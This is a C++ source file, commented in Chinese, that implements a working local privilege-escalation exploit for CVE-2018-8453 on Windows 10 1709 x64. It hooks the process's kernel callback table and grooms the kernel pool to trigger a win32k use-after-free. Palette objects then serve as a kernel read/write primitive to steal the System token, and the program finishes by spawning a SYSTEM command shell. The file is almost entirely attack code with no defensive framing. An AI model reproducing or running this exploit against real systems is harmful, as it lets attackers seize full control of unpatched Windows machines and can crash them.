// CVE-2018-8453.cpp : 定义控制台应用程序的入口点。
//

//#include "stdafx.h"
#include <iostream>
#include <string.h>
#include <windows.h>
#include <tchar.h>
#include<intrin.h>
using namespace std;

VOID FMenuName(VOID);
VOID Hook_Init(VOID);
UINT GetSystem(VOID);
ULONG64 UAF_80(VOID);
UINT UAF_Tag_Cls(VOID);
VOID Pool_FengShui(VOID);
UINT CreateWindows(VOID);
VOID fnDWORDHook(PMSG MSG);
ULONG64 GetMenuAddress(VOID);
EXTERN_C ULONG64 GetPeb(VOID);
VOID GetPalette_Address(VOID);
ULONG64 FindThisProcessEPROCESSAddress(VOID);
PVOID Find_HMValidateHandle(PVOID IsMenu_Address);
EXTERN_C ULONG64 NtUserSetWindowFNID(HANDLE, UINT);
PVOID Find_Functions(LPCSTR Dll_Name, LPCSTR F_Name);
VOID xxxClientAllocWindowClassExtraBytesHook(PVOID MSG);


typedef HWND(__fastcall * My_HMValidateHandle)(
	HWND        Window,
	ULONG		Number
);

typedef BOOL(WINAPI * My_EnumDeviceDrivers)(
	LPVOID  *lpImageBase,
	DWORD   cb,
	LPDWORD lpcbNeeded
);


typedef VOID(__fastcall* My_FnFunction)(
	IN PVOID MSG
);

typedef BOOL(WINAPI *LPFN_GLPI)(
	PSYSTEM_LOGICAL_PROCESSOR_INFORMATION,
PDWORD);

UINT Flag = 0;

UCHAR Data[0x2000] = { 0 };

LOGPALETTE *Palette = NULL;

ULONG64 TagCls_Menu_Address[0x1000], System_EPROCESS = NULL, System_EPROCESS_Address=NULL;

HBITMAP S0xF70[0x1000], S0x90[0x2000];


HPALETTE Where_PALETTE = NULL, What_PALETTE = NULL;

HWND Window = NULL, SrollBar = NULL, New_SrollBar = NULL;

PVOID IsMenu_Address = NULL, HMValidateHandle_Address = NULL;

ULONG64 PEB = NULL, fnDWORD_Address = NULL, To_Where_A_Palette = NULL, UlClientDelta = NULL;

My_HMValidateHandle HMValidateHandle = NULL;

My_EnumDeviceDrivers EnumDeviceDrivers1 = NULL;


My_FnFunction fnDword = NULL, xxxClientAllocWindowClassExtraBytes = NULL;

UINT CreateWindows(VOID){

	HINSTANCE hInstance;
	WNDCLASS wndclass = { 0 };

	{

		hInstance = GetModuleHandleA(0);
		wndclass.style = CS_HREDRAW | CS_VREDRAW;
		wndclass.lpfnWndProc = DefWindowProc;
		wndclass.hInstance = hInstance;
		wndclass.cbClsExtra = 0x00;
		wndclass.cbWndExtra = 0x08;
		wndclass.lpszClassName = "case";

		if (!RegisterClassA(&wndclass)){
			cout << "RegisterClass Error!" << endl;
			return 1;
		}
	}
	Window = CreateWindowExA(0, "case", NULL, WS_DISABLED, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

	if (!Window){
		cout << "Create Window Error!" << endl;
		return 1;
	}

	//保存句柄在扩展内存中
	SetWindowLongA(Window, 0, (ULONG)Window);

	//WS_CHILD |

	SrollBar = CreateWindowExA(0, "SCROLLBAR", NULL, WS_CHILD | WS_VISIBLE | SBS_HORZ, NULL, NULL, 2, 2, Window, NULL, hInstance, NULL);
	cout << "Window:0x" << hex << Window << endl;
	cout << "SrollBar:0x" << hex << SrollBar << endl;

}


VOID GetPalette_Address(VOID){

	ULONG64 A_Palette_Address = NULL, B_Palette_Address = NULL;

	Palette = (LOGPALETTE*)malloc(sizeof(LOGPALETTE)+(sizeof(PALETTEENTRY)* (0x1D5 - 0x01)));

	memset(Palette, 0x42, sizeof(LOGPALETTE)+(sizeof(PALETTEENTRY)* (0x1D5 - 0x01)));

	Palette->palVersion = 0x0300;
	Palette->palNumEntries = 0x1D5;

	A_Palette_Address = GetMenuAddress();

	cout << "A_Palette_Address:0x" << hex << A_Palette_Address << endl;

	To_Where_A_Palette = A_Palette_Address + 0x2D - 8;

	//内存缩紧
	for (UINT I = 0; I < 0x1500; ++I){
		CreatePalette(Palette);
	}

	UnregisterClassW(L"LEAKWS", GetModuleHandleA(0));

	Where_PALETTE = CreatePalette(Palette);

	What_PALETTE = CreatePalette(Palette);

	cout << "Where_PALETTE:0x" << hex << Where_PALETTE << endl;

	cout << "What_PALETTE:0x" << hex << What_PALETTE << endl;

}

ULONG64 GetNTOsBase(void){
	ULONG64 Bases[0x1000];
	DWORD needed = 0;
	ULONG64 krnlbase = 0;
	if (EnumDeviceDrivers1((LPVOID *)&Bases, sizeof(Bases), &needed)) {
		krnlbase = Bases[0];
	}
	return krnlbase;
}

DWORD GetCpuNumber(VOID){
	LPFN_GLPI glpi;
	BOOL done = FALSE;
	PSYSTEM_LOGICAL_PROCESSOR_INFORMATION buffer = NULL;
	PSYSTEM_LOGICAL_PROCESSOR_INFORMATION ptr = NULL;
	DWORD returnLength = 0;
	DWORD logicalProcessorCount = 0;
	DWORD numaNodeCount = 0;
	DWORD processorPackageCount = 0;
	DWORD byteOffset = 0;

	glpi = (LPFN_GLPI)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "GetLogicalProcessorInformation");
	if (NULL == glpi){
		puts("[-] GetLogicalProcessorInformation is not supported.");
		return (1);
	}

	while (!done){
		DWORD rc = glpi(buffer, &returnLength);

		if (FALSE == rc){
			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER){
				if (buffer)
					free(buffer);
				buffer = (PSYSTEM_LOGICAL_PROCESSOR_INFORMATION)malloc(returnLength);

				if (NULL == buffer){
					puts("[-] Error: Allocation failure");
					return (1);
				}
			}
			else{
				printf("[-] Error %d\n", GetLastError());
				return 1;
			}
		}
		else{
			done = TRUE;
		}
	}

	ptr = buffer;

	while (byteOffset + sizeof(SYSTEM_LOGICAL_PROCESSOR_INFORMATION) <= returnLength){
		switch (ptr->Relationship){
		case RelationProcessorPackage:
			processorPackageCount++;
		default:
			break;
		}
		byteOffset += sizeof(SYSTEM_LOGICAL_PROCESSOR_INFORMATION);
		ptr++;
	}

	return processorPackageCount;
}

ULONG64 PsInitialSystemProcess(VOID){
	char *Un = NULL;
	Un = (char *)malloc(0x20);
	int tmp[4];
	BOOL pae = FALSE;

	RtlSecureZeroMemory(tmp, sizeof(tmp));

	__cpuid(tmp, 1);

	if (tmp[3] & 0x40){
		pae = TRUE;
	}

	if (GetCpuNumber()>1){
#ifndef _WIN64
		if (pae){
			strcpy(Un, "ntkrpamp.exe");
		}
		else
#endif
		{
			strcpy(Un, "ntkrnlmp.exe");
		}
	}
	else{
#ifndef _WIN64
		if (pae){
			strcpy(Un, "ntkrnlpa.exe");
		}
		else
#endif
		{
			strcpy(Un, "ntoskrnl.exe");
		}
	}

	ULONG64 ntos = (ULONG64)LoadLibraryA((LPCSTR)Un);
	ULONG64 addr = (ULONG64)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
	FreeLibrary((HMODULE)ntos);
	ULONG64 res = 0;
	ULONG64 ntOsBase = GetNTOsBase();
	if (ntOsBase) {
		res = addr - ntos + ntOsBase;
	}
	return res;
}



UINT GetSystem(VOID){

	UCHAR Data[0x200] = { 0 };

	// 1 = 4
	PVOID EnumDeviceDrivers_Address = NULL;
	EnumDeviceDrivers_Address = Find_Functions("Psapi.dll", "EnumDeviceDrivers");
	EnumDeviceDrivers1 = (My_EnumDeviceDrivers)EnumDeviceDrivers_Address;

	System_EPROCESS = PsInitialSystemProcess();

	//此处为0x1DE 读取 What_Palette 的句柄
	GetPaletteEntries(Where_PALETTE, 0x1DE, 2, (LPPALETTEENTRY)&Data);

	if (*(HPALETTE*)Data != What_PALETTE){
		//Pool FengShui Error 但是不用担心,失败了一样会蓝屏,只有利用成功才会修复,哈哈哈哈哈哈哈
		return 1;
	}

	*(ULONG64*)Data = System_EPROCESS;
	//读取System_EPRCOESS
	SetPaletteEntries(Where_PALETTE, 0x1DE+0x1E, 2, (LPPALETTEENTRY)&Data);

	GetPaletteEntries(What_PALETTE, 0, 2, (LPPALETTEENTRY)&System_EPROCESS_Address);

	//读取System Token
	ULONG64 SystemToken = NULL;
	*(ULONG64*)Data = System_EPROCESS_Address + 0x358;
	SetPaletteEntries(Where_PALETTE, 0x1DE + 0x1E, 2, (LPPALETTEENTRY)&Data);
	GetPaletteEntries(What_PALETTE, 0, 2, (LPPALETTEENTRY)&SystemToken);

	//修改当前进程Token
	ULONG64 Token_Address = FindThisProcessEPROCESSAddress();
	*(ULONG64*)Data = Token_Address;
	SetPaletteEntries(Where_PALETTE, 0x1DE + 0x1E, 2, (LPPALETTEENTRY)&Data);
	SetPaletteEntries(What_PALETTE, 0, 2, (LPPALETTEENTRY)&SystemToken);

}

ULONG64 FindThisProcessEPROCESSAddress(VOID){

	UCHAR Find[0x20] { 0 };
	ULONG64 processId = GetCurrentProcessId(), Next_Process = System_EPROCESS_Address;

	do{
		*(ULONG64*)Find = Next_Process + 0x2E0;

		SetPaletteEntries(Where_PALETTE, 0x1DE + 0x1E, 2, (LPPALETTEENTRY)&Find);

		GetPaletteEntries(What_PALETTE, 0, 2, (LPPALETTEENTRY)&Find);

		//找到当前进程EPROCESS
		if (*(ULONG64*)Find == processId){
			return Next_Process+0x358;
		}
		//循环链表查找
		*(ULONG64*)Find = Next_Process + 0x2E8;

		SetPaletteEntries(Where_PALETTE, 0x1DE + 0x1E, 2, (LPPALETTEENTRY)&Find);

		GetPaletteEntries(What_PALETTE, 0, 2, (LPPALETTEENTRY)&Next_Process);

		Next_Process -= 0x2E8;


	} while (1);

}



VOID FMenuName(VOID){
	ULONG64 Zero = 0;
	UCHAR Menu[0x20] = { 0 };

	for (UINT I = 0; I <0x1000; ++I){
		if (TagCls_Menu_Address[I] == 0){
			continue;
		}
		*(ULONG64*)Menu = TagCls_Menu_Address[I];

		SetPaletteEntries(Where_PALETTE, 0x1DE + 0x1E, 2, (LPPALETTEENTRY)&Menu);

		SetPaletteEntries(What_PALETTE, 0, 2, (LPPALETTEENTRY)&Zero);
	}
}



ULONG64 UAF_80(VOID){

	UINT I = 0;
	HWND hwnd = NULL;
	HINSTANCE hInstance;
	WNDCLASSW wndclass = { 0 };
	ULONG64 PTagWnd = NULL, TagCls = NULL;

	UCHAR MenuNames[0x100] = { 0 }, ClassName[0x50] = { 0 };

	memset(MenuNames, 0x43, 0x80 - 0x20);

	*(ULONG64*)((ULONG64)MenuNames + 0x10) = To_Where_A_Palette;
	*(ULONG64*)((ULONG64)MenuNames + 0x08) = To_Where_A_Palette;

	while (I < 0x1000){

		sprintf((char *)ClassName,"WindowUaf%d",I);

		hInstance = GetModuleHandleA(0);
		wndclass.style = CS_HREDRAW | CS_VREDRAW;
		wndclass.lpfnWndProc = DefWindowProc;
		wndclass.hInstance = hInstance;
		wndclass.lpszMenuName = (LPCWSTR)MenuNames;
		wndclass.lpszClassName = (LPCWSTR)ClassName;

		if (!RegisterClassW(&wndclass)){
			cout << "RegisterClass Error!" << endl;
			return 1;
		}

		hwnd = CreateWindowExW(0, (LPCWSTR)ClassName, NULL, WS_DISABLED, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

		PTagWnd = (ULONG64)HMValidateHandle(hwnd, 0x01);

		UlClientDelta = (ULONG64)((*(ULONG64*)(PTagWnd + 0x20)) - (ULONG64)PTagWnd);

		TagCls = (*(ULONG64*)(PTagWnd + 0xa8)) - UlClientDelta;

		//Kernel Pool TagCls.lpszMenuName
		TagCls_Menu_Address[I] = TagCls + 0x98 + UlClientDelta;

		++I;
	}
}



ULONG64 GetMenuAddress(VOID){

	HWND hwnd = NULL;
	HINSTANCE hInstance;
	WNDCLASSW wndclass = { 0 };

	UCHAR MenuNames[0x2000] = { 0 };

	memset(MenuNames,0x43,0x1000-10);

	{

		hInstance = GetModuleHandleA(0);
		wndclass.style = CS_HREDRAW | CS_VREDRAW;
		wndclass.lpfnWndProc = DefWindowProc;
		wndclass.hInstance = hInstance;
		wndclass.lpszMenuName = (LPCWSTR)MenuNames;
		wndclass.lpszClassName = L"LEAKWS";

		if (!RegisterClassW(&wndclass)){
			cout << "RegisterClass Error!" << endl;
			return 1;
		}
	}

	hwnd = CreateWindowExW(0, L"LEAKWS", NULL, WS_DISABLED, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

	if (!hwnd){
		cout << "Create Window Error!" << endl;
		return 1;
	}

	IsMenu_Address = Find_Functions("user32.dll", "IsMenu");
	HMValidateHandle_Address = Find_HMValidateHandle(IsMenu_Address);
	printf("HMValidateHandle Address(0x%p)\n", HMValidateHandle_Address);
	HMValidateHandle = (My_HMValidateHandle)HMValidateHandle_Address;

	ULONG64 PTagWnd = NULL, TagCls = NULL;

	//创建窗口在用户映射桌面堆的位置
	PTagWnd = (ULONG64)HMValidateHandle(hwnd, 0x01);

	UlClientDelta = (ULONG64)((*(ULONG64*)(PTagWnd + 0x20)) - (ULONG64)PTagWnd);

	TagCls = (*(ULONG64*)(PTagWnd + 0xa8)) - UlClientDelta;

	cout << "TagWnd:0x" << hex << PTagWnd << endl;

	cout << "TagCls:0x" << hex << TagCls << endl;

	DestroyWindow(hwnd);

	return *(ULONG64*)(TagCls + 0x98);


}


PVOID Find_Functions(LPCSTR Dll_Name, LPCSTR F_Name){
	HMODULE Dll_HMODULE = NULL;
	PVOID F_Address = NULL;
	Dll_HMODULE = LoadLibraryA(Dll_Name);
	if (Dll_HMODULE == NULL){
		printf("%s Find Error!\n", Dll_Name);
		return NULL;
	}
	printf("Address(%s):0x%p\n", Dll_Name, Dll_HMODULE);
	F_Address = GetProcAddress(Dll_HMODULE, F_Name);
	if (F_Address == NULL){
		printf("Function(%s) Find Error!\n", F_Name);
		return NULL;
	}
	printf("Address(%s):0x%p\n", F_Name, F_Address);

	return F_Address;
}

PVOID Find_HMValidateHandle(PVOID IsMenu_Address){
	ULONG64 HMV_Adr = 0;
	while (1){
		if (*(char *)IsMenu_Address == '\xE8'){
	
			HMV_Adr = *(ULONG*)((ULONG64)IsMenu_Address + 1);

			HMV_Adr += (ULONG64)IsMenu_Address + 0x05 - 0x100000000;

			return (PVOID)HMV_Adr;
		}
		IsMenu_Address = (char *)IsMenu_Address + 1;
	}

	return 0;
}


VOID fnDWORDHook(PMSG MSG){

	if (*(DWORD*)MSG && Flag && *((PULONG64)MSG + 1) == 0x31f){
		Flag = 0;
		DestroyWindow(Window);
	}

	if (*((PULONG64)MSG + 1) == 0x70){
		cout << "SendMessage" << endl;

		//这里申请0x80字节 占用释放的tagSBTrack结构
		/*
		...Some Code...
		*/


		*(ULONG64*)((ULONG64)Data + 0x10) = To_Where_A_Palette;
		*(ULONG64*)((ULONG64)Data + 0x08) = To_Where_A_Palette;

		for (UINT I = 0; I < 0x2000; ++I){
			CreateBitmap(0x70, 0x01, 0x01, 0x08, Data);
		}

		SendMessageA(New_SrollBar, 0x1F, 0, 0);

		UAF_80();


	}
	fnDword(MSG);

}


VOID xxxClientAllocWindowClassExtraBytesHook(PVOID MSG){

	if ((*(HWND*)*(HWND*)MSG) == Window){
		cout << "xxxClientAllocWindowClassExtraBytes" << endl;
		//为什么要创建新滚动条控件呢,因为子滚动条控件的父窗口被释放后,无法获取到滚动条的内核地址了
		New_SrollBar = CreateWindowExA(0, "SCROLLBAR", NULL, SBS_HORZ | WS_HSCROLL | WS_VSCROLL, NULL, NULL, 2, 2, NULL, NULL, GetModuleHandleA(0), NULL);
		NtUserSetWindowFNID(Window, 0x2A1);
		SetCapture(New_SrollBar);
	}

	xxxClientAllocWindowClassExtraBytes(MSG);
}

//Windows10 1709 X64
VOID Hook_Init(VOID){

	DWORD OldType = 0;

	ULONG64 KernelCallbackTable = *(ULONG64*)(PEB + 0x58);

	VirtualProtect((LPVOID)KernelCallbackTable, 0x1024, PAGE_EXECUTE_READWRITE, &OldType);

	//fnDWORD
	fnDword = (My_FnFunction)*(ULONG64*)(KernelCallbackTable + 0x08 * 0x02);

	*(ULONG64*)(KernelCallbackTable + 0x08 * 0x02) = (ULONG64)fnDWORDHook;

	//xxxClientAllocWindowClassExtraBytes

	xxxClientAllocWindowClassExtraBytes = (My_FnFunction)*(ULONG64*)(KernelCallbackTable + 0x08 * 0x7E);
	//0x80
	*(ULONG64*)(KernelCallbackTable + 0x08 * 0x7E) = (ULONG64)xxxClientAllocWindowClassExtraBytesHook;
}

VOID CreateCmd(){
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)& si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
	exit(1);
}

int _tmain(int argc, _TCHAR* argv[]){

	//获取PEB地址
	PEB = GetPeb();
	//创建窗口
	CreateWindows();

	//获取两个PALETTE结构的地址
	GetPalette_Address();

	{
		//Hook
		Hook_Init();
		Flag = 1;

		//向滚动条发送点击消息
		SendMessageA(SrollBar, WM_LBUTTONDOWN, MK_LBUTTON, 0x00080008);
	}

	//System!
	GetSystem();
	
	//修复TagCls,将lpszMenuName全部设为NULL,拒绝蓝屏
	FMenuName();

	CreateCmd();
	
	getchar();
	return 0;
}

